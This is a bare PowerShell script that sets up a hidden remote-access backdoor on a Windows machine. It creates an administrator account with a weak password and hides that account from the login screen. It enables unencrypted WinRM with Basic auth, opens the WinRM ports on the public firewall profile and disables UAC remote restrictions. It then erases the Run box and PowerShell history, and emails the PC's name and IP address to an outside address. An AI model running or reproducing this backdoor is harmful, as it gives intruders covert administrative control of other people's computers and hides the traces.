# Define new local user credentials
$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Enable Windows Remote Management (WinRM)
Set-Service -Name WinRM -StartupType Automatic
Start-Service -Name WinRM

# Configure WinRM settings
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}
winrm quickconfig -force
winrm create winrm/config/listener?Address=*+Transport=HTTP @{Port="5985"}
winrm create winrm/config/listener?Address=*+Transport=HTTPS @{Port="5986"}

# Allow WinRM through the firewall
New-NetFirewallRule -DisplayName "Allow WinRM on Public" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -Profile Public
New-NetFirewallRule -DisplayName "Allow WinRM Secure" -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow -Profile Public

# Disable UAC remote restrictions for admin access
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "$Username" -Value 0 -PropertyType DWORD -Force

# Delete Run box and PowerShell history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Get Local IP Address
$LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -ExpandProperty IPAddress) -join ", "

# Email Configuration for Outlook
$SMTPServer = "smtp.office365.com"
$SMTPPort = "587"
$From = "your-outlook-email@outlook.com"      # Replace with your Outlook email
$To = "recipient-email@outlook.com"          # Replace with the recipient email
$Subject = "New PC Online - $env:COMPUTERNAME"
$Body = "ðŸš€ New PC Online!`n`nPC Name: $env:COMPUTERNAME`nUsername: Admin`nLocal IP: $LocalIP"

# Send Email (Use the real password for this Outlook account)
$SecurePassword = ConvertTo-SecureString "your-outlook-password" -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential ($From, $SecurePassword)
Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Creds

# Exit script
Exit
